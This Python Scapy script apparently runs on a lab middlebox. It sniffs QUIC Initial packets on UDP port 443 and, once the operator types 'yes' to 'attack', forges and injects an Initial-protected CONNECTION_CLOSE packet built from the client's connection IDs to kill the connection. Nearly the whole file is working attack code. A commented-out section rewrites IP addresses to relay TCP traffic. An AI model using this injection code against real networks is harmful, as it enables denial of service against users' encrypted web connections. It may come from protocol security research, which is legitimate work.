import os

from scapy.all import *
load_contrib("quic")

from scapy.layers.quic import *
from connection_close import QUIC_CONNECTION_CLOSE
bind_bottom_up(UDP, QUIC, dport=443)
bind_bottom_up(UDP, QUIC, sport=443)
bind_layers(UDP, QUIC, dport=443, sport=443)
from forge import forge_cc_scapy




def handle_quic(pkt):
    # Only process if this packet has a QUIC Initial header
    if pkt.haslayer(UDP) and pkt.getlayer(Ether).src != get_if_hwaddr('middlebox-eth0'):
        if pkt.sniffed_on == 'middlebox-eth0' and QUIC_Initial in pkt:
            qi = pkt[QUIC_Initial]
            print(f"""QUIC Initial packet detected
              - IP Src : {pkt[IP].src}
              - IP Sport : {pkt[UDP].sport}
              - IP Dst : {pkt[IP].dst}
              - IP Dport : {pkt[UDP].dport}
              - Version       : 0x{qi.Version:08X}
              - DestConnID    : {qi.DstConnID.hex()}
              - SrcConnID     : {qi.SrcConnID.hex()}
              - TokenLength   : {qi.TokenLen}")
              - PacketNumber  : {qi.PacketNumber}")
              - PayloadLength : {qi.Length}""")
            # Raw (still encrypted) payload bytes
            #raw = bytes(qi.payload)
            #print(f"  - Encrypted payload (first 32B): {raw[:32].hex()}…")
            if input("Enter 'yes' to attack!: ") == "yes":
                """if pkt.sniffed_on == 'middlebox-eth0':
                    print(Fore.GREEN + pkt.summary())
                    ports[pkt[TCP].sport] = pkt[IP].src
                    print(f"{Fore.GREEN} {ports}")
                    new_pkt = pkt[IP]
                    new_pkt[IP].src = "10.69.0.100"
                    del new_pkt.getlayer(IP).chksum
                    del new_pkt.getlayer(TCP).chksum
                    print(f"New PKT: {new_pkt.summary()}")
                    send(new_pkt)
                elif pkt.sniffed_on == 'middlebox-eth1':
                        if pkt[TCP].dport in ports:
                            print(Fore.RED + pkt.summary())
                            new_pkt = pkt[IP]
                            new_pkt[IP].dst = ports[pkt[TCP].dport]
                            del new_pkt.getlayer(IP).chksum
                            del new_pkt.getlayer(TCP).chksum
                            print(f"New PKT: {new_pkt.summary()}")
                            send(new_pkt)"""
                initial =  QUIC_Initial(
                    Version      = 0x00000001,
                    DstConnIDLen = len(qi.SrcConnID), DstConnID=qi.SrcConnID,
                    SrcConnIDLen = len(qi.DstConnID), SrcConnID=qi.DstConnID,
                    TokenLen     = 0,
                    Token        = b'',
                    PacketNumber = 1,
                    # length = size of everything after the PacketNumber field
                    # here: one CC frame only
                    Length       = len(QUIC_CONNECTION_CLOSE())
                )

                # build a CONNECTION_CLOSE frame
                cc = QUIC_CONNECTION_CLOSE(
                    type          = 0x1C,
                    error_code    = 0x10,         # arbitrary error
                    frame_type    = 0,            # e.g. PADDING triggered it
                    reason_phrase = b"oops!"
                )
                frame  = bytes(cc)
                tpl    = (pkt[IP].src, pkt[UDP].sport, pkt[IP].dst, pkt[UDP].dport)
                dcid_for_keys   = qi.DstConnID      # client-chosen DCID → secrets
                dcid_in_header  = qi.SrcConnID      # client’s SrcCID     → header
                forged = forge_cc_scapy(
                    dcid_secret = dcid_for_keys,
                    dcid_header = dcid_in_header,
                    tpl = tpl,
                    frame = frame)
                send(forged)


        

# Sniff UDP 443 traffic and invoke handle_quic for each packet
sniff(
    #iface="Ethernet 2",
    iface=['middlebox-eth0', 'middlebox-eth1'],
    #filter="udp port 443",
    prn=handle_quic,         # callback for every packet
    store=False                  # don’t keep packets in memory
)
